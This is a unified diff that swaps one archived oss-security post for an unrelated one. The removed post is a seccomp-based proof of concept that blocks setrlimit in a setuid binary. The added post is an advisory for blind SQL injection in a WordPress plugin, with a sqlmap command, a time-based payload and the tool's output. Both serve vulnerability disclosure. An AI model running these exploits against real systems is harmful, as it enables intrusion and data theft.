@@ -1,127 +1,55 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/01/08/2
-Message-ID: <1483876318.5179.50.camel@juliet.mcarpenter.org>
-Date: Sun, 08 Jan 2017 12:51:58 +0100
-From: Martin Carpenter <mcarpenter@...e.fr>
-To: oss-security@...ts.openwall.com
-Subject: Re: Re: Firejail local root exploit
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/08/25/2
+Message-id: <29FBF111-3395-49B0-8A35-4E6D36963175@me.com>
+Date: Fri, 25 Aug 2017 12:03:02 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: Blind SQL Injection in Wordpress plugin wordpress-gallery-transformation v1.0
 Content-Type: text/plain; charset=utf-8
 
-On Sat, 2017-01-07 at 14:21 +0100, Martin Carpenter wrote:
-> prctl(PR_CAPBSET_DROP, ...) (see caps.c) requires CAP_SETPCAP. 
+Title: Authenticated Blind SQL Injection in Wordpress plugin wordpress-gallery-transformation v1.0
+Author: Larry W. Cashdollar, @_larry0
+Date: 2017-07-22
+CVE-ID:[CVE-2017-1002028]
+Download Site: https://wordpress.org/plugins/wordpress-gallery-transformation/
+Vendor: http://angrybyte.com
+Vendor Notified: 2017-08-07
+Vendor Contact: plugins@...dpress.org
+Advisory: http://www.vapidlabs.com/advisory.php?v=199
+Description: Transforms word press into a gallery, wallpapers website, you name it.
+Vulnerability:
+SQL injection is in ./wordpress-gallery-transformation/gallery.php via $jpic parameter being unsanitized before being passed into an SQL query.
 
-Oops, I was looking at the wrong flag: PR_SECCOMP_SET doesn't require
-capabilities. Thanks sivmu.
+--
+231-
+232- $pfx=$wpdb->prefix;
+233-dbcreator();
+234- if($_GET['picnj']){
+235-
+236: $jpic=$_GET['picnj'];
+237: $jnm=$_GET['nmj'];
+238- $wpdb->query("update {$pfx}gallery set name='{$jnm}' where id=$jpic;");
+239- $wpdb->query("update {$pfx}gallery set rates=44");
+240- return 'ok?';
 
-So that... doesn't improve things, quite the opposite. Here's
-disable_coredumps() from sudo 1.8.9p5 (as shipped with Ubuntu 14.04,
-which does not disable suid coredumps on desktop by default):
+The attacker will need to be logged in and able to manage the gallery in order to exploit.
 
- 784 /*
- 785  * Disable core dumps to avoid dropping a core with user password
-in it.
- 786  * We will reset this limit before executing the command.
- 787  * Not all operating systems disable core dumps for setuid
-processes.
- 788  */
- 789 static void
- 790 disable_coredumps(void)
- 791 {
- 792 #if defined(RLIMIT_CORE)
- 793     struct rlimit rl;
- 794     debug_decl(disable_coredumps, SUDO_DEBUG_UTIL)
- 795 
- 796     /*
- 797      * Turn off core dumps?
- 798      */
- 799     if (sudo_conf_disable_coredump()) {
- 800     (void) getrlimit(RLIMIT_CORE, &corelimit);
- 801     memcpy(&rl, &corelimit, sizeof(struct rlimit));
- 802     rl.rlim_cur = 0;
- 803     (void) setrlimit(RLIMIT_CORE, &rl);
- 804     }
- 805     debug_return;
- 806 #endif /* RLIMIT_CORE */
- 807 }
-
-The return value from setrlimit() at line 803 is not checked.
-
-PoC: two programs (below): foo, to set up a seccomp filter (using
-libseccomp) to fail calls to setrlimit() and then fork/exec bar, which
-duplicates disable_coredumps() above, setuid-root, 4755. All works as
-expected: a non-privileged user can prevent the call to setrlimit() in
-privileged bar and execution continues. (The filter is inherited since
-calls to fork, exec are not blocked).
-
-Again we can probably push root cause off to sudo's failure to check the
-setrlimit() return value (or Ubuntu's defaults...) but pragmatically
-there just has to be more stuff out there like this. sudo was literally
-the first thing I looked at... Disabling filter inheritance across the
-privilege boundary doesn't seem like an obviously good solution(?).
-
-OpenBSD's pledge(2), by contrast, only sends uncatchable-SIGABRT and
-pledges are not inherited by subprocesses, privileged or not.
-
-
-$ cat foo.c
-
-#include <linux/seccomp.h>
-#include <seccomp.h>
-#include <stdio.h>
-#include <sys/prctl.h>
-#include <sys/types.h>
-#include <sys/wait.h>
-#include <unistd.h>
-
-int main(int argc, const char *argv[])
-{
-  int status;
-  char *args[] = { "./bar", NULL };
-  scmp_filter_ctx ctx;
-  switch(fork()) {
-      case -1: /* error */
-          perror("fork");
-          return 1;
-          break;
-      case 0: /* child */
-          ctx = seccomp_init(SCMP_ACT_ALLOW); // permit all
-          seccomp_rule_add(ctx, SCMP_ACT_ERRNO(1), SCMP_SYS(setrlimit),
-0); // blacklist setrlimit
-          seccomp_load(ctx);
-          execv(args[0], args);
-          perror("execv");
-          _exit(1);
-          break;
-      default:
-          if(-1 == wait(&status)) {
-              perror("wait");
-              return 1;
-          }
-          printf("exit code %d\n", WEXITSTATUS(status));
-  }
-  return 0; 
-}
-$ cat bar.c
-
-#include <sys/time.h>
-#include <sys/resource.h>
-#include <string.h>
-
-int main(int argc, const char *argv[])
-{
-    struct rlimit rl;
-    struct rlimit corelimit;
-    (void) getrlimit(RLIMIT_CORE, &corelimit);
-    memcpy(&rl, &corelimit, sizeof(struct rlimit));
-    rl.rlim_cur = 0;
-    return setrlimit(RLIMIT_CORE, &rl) ? 2 : 0;
-}
-$ gcc -o foo foo.c -lseccomp
-$ gcc -o bar bar.c
-$ sudo chown root bar
-$ sudo chmod 4755 bar
-$ ./foo 
-exit code 2
-$
-
-
+Exploit Code:
+	• $ sqlmap --load-cookies=./cookie -u 'http://example.com/wp-admin/options-general.php?page=wordpress-gallery-transformation/gallery.php&picnj=*' --level 4 --risk 3 --dbms mysql
+	•  
+	•  
+	• URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+	• sqlmap identified the following injection point(s) with a total of 2556 HTTP(s) requests:
+	• ---
+	• Parameter: #1* (URI)
+	•    Type: AND/OR time-based blind
+	•    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+	•    Payload: http://example.com:80/wp-admin/options-general.php?page=wordpress-gallery-transformation/gallery.php&picnj=(CASE WHEN (4165=4165) THEN SLEEP(5) ELSE 4165 END)
+	• ---
+	• [13:16:53] [INFO] the back-end DBMS is MySQL
+	• web server operating system: Linux Ubuntu 16.04 (xenial)
+	• web application technology: Apache 2.4.18
+	• back-end DBMS: MySQL >= 5.0.12
+	• [13:16:53] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com'
+	•  
+	• [*] shutting down at 13:16:53
